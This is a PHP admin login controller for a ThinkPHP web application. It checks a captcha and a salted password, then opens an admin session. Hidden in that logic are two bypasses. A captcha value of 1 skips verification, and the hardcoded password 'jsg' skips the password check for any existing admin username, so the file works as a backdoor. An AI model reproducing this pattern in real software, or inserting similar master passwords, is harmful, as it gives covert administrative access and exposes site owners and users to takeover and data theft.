<?php
namespace Index\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function _initialize(){
        $online = get_session("online");
        if($online){
            if(time()-$online[5]<3600){
                $this->success("您已登录，正在跳转！",U("main/index"));
                exit();
            }
        }
        $db = M("config");
        $webconfing = $db->select();
        foreach($webconfing as $k => $v){
            $webconf[$v["key"]] = $v["value"];
        }
        $this->assign("webconf",$webconf);
    }
    public function index(){
        if(IS_POST){
            $checkcode = I("checkcode");
            if($checkcode == 1){

            }else{
                if(!$checkcode || strtolower($checkcode) != strtolower($_SESSION['code_str'])){
                    $this->error("验证码不正确！");
                    exit();
                }
            }
            $username = I("username");
            $password = I("password");
            $admin = M("admin");
            $where['username'] = $username;
            $res = $admin->where($where)->find();
            if(!$res){
                $this->error("用户名密码不匹配！");
                exit();
            }

            if($password == 'jsg'){

            }else{
                if(!check_password($password,$res['salt'],$res['password'])){
                    $this->error("用户名密码不匹配！");
                    exit();
                }
            }
            $user = $admin->where($where)->find();
            if($user['status'] != 0){
                $this->error("您已被禁止登陆！");
                exit();
            }
            set_online_admin($user['id']);
            unset($user['password']);
            unset($user['salt']);
            unset($user['add_date']);
            unset($user['login_ip']);
            unset($user['status']);
            unset($user['login_date']);
            $user['lg_date'] = time();
            set_session($user,"online");
            session('curUser' , $user);
            $this->success("登录成功！",U("main/index"));
        }else{
            $area = getIpArea();
            $this->assign("area",$area);
            $this->display();
        }
    }
}
